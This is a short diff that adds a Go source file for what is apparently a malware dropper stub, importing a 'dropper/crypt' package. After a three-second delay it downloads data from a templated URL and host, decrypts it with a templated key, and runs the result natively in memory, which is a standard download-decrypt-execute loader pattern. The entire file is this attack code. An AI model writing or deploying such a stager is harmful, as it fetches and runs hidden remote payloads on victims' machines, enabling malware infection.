@@ -1,0 +1,18 @@
+package main
+
+import (
+	"dropper/crypt"
+	"time"
+)
+
+func main() {
+
+	time.Sleep(time.Second * 3)
+	url := "{{ .Url }}"
+	host := "{{ .Host }}"
+	key := "{{ .Key }}"
+	data := crypt.Download(url, host)
+	dec := crypt.Decrypt([]byte(key), data)
+	crypt.RunNative(dec)
+
+}
